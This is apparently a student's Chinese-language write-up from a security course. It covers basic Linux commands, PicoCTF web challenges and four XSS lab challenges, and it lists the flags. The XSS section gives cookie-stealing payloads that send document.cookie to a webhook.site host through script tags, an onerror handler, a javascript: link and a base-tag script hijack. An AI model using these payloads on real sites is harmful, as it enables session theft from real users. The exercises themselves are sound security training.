AIS3 Junior 2025 Linux指令與前端Lab課程

一、Linux Command

資料管理：

  • ls 列出當前目錄下的內容
  • cd 切換當前目錄
  • pwd 列出當前位置
  • cp 複製檔案或目錄
  • mv 移動/重新命名檔案
  • rm 刪除檔案或目錄
  • mkdir/rmdir 創建/刪除資料夾
  • touch 建立一個檔案
  • find尋找檔案
  • stat 顯示檔案詳細資訊

檔案處理：

  • cat 印出內容
  • nano/vim 編輯內容
  • grep 搜尋文字
  • strings 搜尋字串
  • chmod/chown 變更檔案權限/擁有者

系統管理：

  • whoami 顯示當前使用者
  • sudo 以管理員身份執行
  • passwd 更改密碼
  • kill 終止程式

遠端與網路：

  • ssh 遠端登入至伺服器
  • curl 用來傳輸資料/發起請求(http/https)
  • ping 測試伺服器連線情況

二、Command Pratice

第一題

在講師提供的終端機環境中 cd進入challenge1
ls列出檔案列表 發現有名為flag的檔案
cat flag便可列出檔案內容得到Flag
AIS3{C0N9_Y0UR_F1R57_F1A9_😼}

第二題

cd進入challenge2
ls列出檔案列表 並未出現任何檔案
使用ls -a列出所有檔案和隱藏檔案 發現有.flag的檔案
cat後得到Flag
AIS3{15_a1_W0N7_M155_D07_🚩}

第三題

cd進入challenge3
ls列出檔案列表 發現flag 但權限不夠
使用chmod 644 flag更改檔案權限
cat flag顯示出一個要求 要我們在/tmp下建立一個名為meow的檔案
使用touch建立後就立刻獲得Flag
AIS3{M30W_M30W_900D_J0B5}

第四題

cd進入challenge４
ls發現flag和grep在challende4目錄下
cat flag後得到
移動grep到challenge5目錄下的指令
使用mv移動後即獲得Flag
AIS3{M0V3_M0VE_HURRY_UP!}

第五題

cd進入challenge5
使用剛剛移動至此的grep
輸入./grep -r "AIS3" .
和./grep -r "}" .
就可以找到兩段Flag
AIS3{M4st3r_0f_S34rch_1$_p0w3rfu11}

第六題

利用上述方法找到Flag後
依提示rm flag
便可得到Flag
AIS3{RM_RF_CHUMMY_/_D0N7_D0_17_PL5}

三、PicoCTF Pratice

GET aHEAD

根據題目名稱猜測要使用HEAD method來取得Flag
使用burpsuite工具 用HEAD重送封包後

便得到Flag

Cookies

一開始會得到此畫面 此時的cookies value = -1

將snickerdoodle輸入後搜尋 發現網頁的cookies value從-1變成0

猜測解法應與cookies value大小有關
再重複測試增加cookies value後
在cookies value=18時

得到了Flag

Inspect HTML

題目名稱叫我們檢查HTML檔
經過檢查發現Flag就在HTML中

Bookmarklet

網頁提供了一段js code

複製下來後在網頁console中運行 便可得到Flag

WebDecode

經過翻找後 在about頁面的html中找到一串亂碼

丟入base64 decode後即獲得Flag

四、XSS Pratice

XSS1

在輸入匡輸入任意內容後
發現網頁HTML中會把輸入內容變成<p>輸入內容</p>
接下來測試看看<script>alert(1)</script>
可以成功跳出訊息
接下來使用webhook去獲取使用者的cookie
fetch('https://webhook.site/xxxxxxxxxxx'+document.cookie)
回傳給admin後便可以得到一串亂碼 丟入base64 decode即可獲得Flag
NCKUCTF{w3lc0m3_70_x55_w0rld}

XSS2

將輸入改成
<img src = x onerror = fetch('https://webhook.site/xxxxxxxx'+document.cookie)>
便可依照上述方法獲得Flag
NCKUCTF{p53ud0_pr070c4l_15_50m3_71m3_3v4l}

XSS3

觀察發現 輸入的連結會變成超連結的連結網址
利用javascript:偽協議將webhook連結放入程式碼中
fetch('https://webhook.site/xxxxxxxxxxx'+document.cookie)
便可依照XSS1、XSS2的解法獲取Flag
NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}

XSS4

因為網頁有一次性隨機數(nonce)的存在
無法直接XSS
但可以注意到note.html下 有一個<base>元素
我在Github Pages儲存庫中新增一個/static/script.js的檔案
並在js檔中放入
fetch('https://webhook.site/xxxxxx'+document.cookie)
回到網頁 在輸入欄中輸入<base href=https://zergling73.com/>
讓網頁連接回Github Pages儲存庫執行script.js
再依照前幾題的方法 即可獲得Flag
NCKUCTF{b453-url_w1ll_n07_f4llb4ck_70_d3f4ul7-5rc}
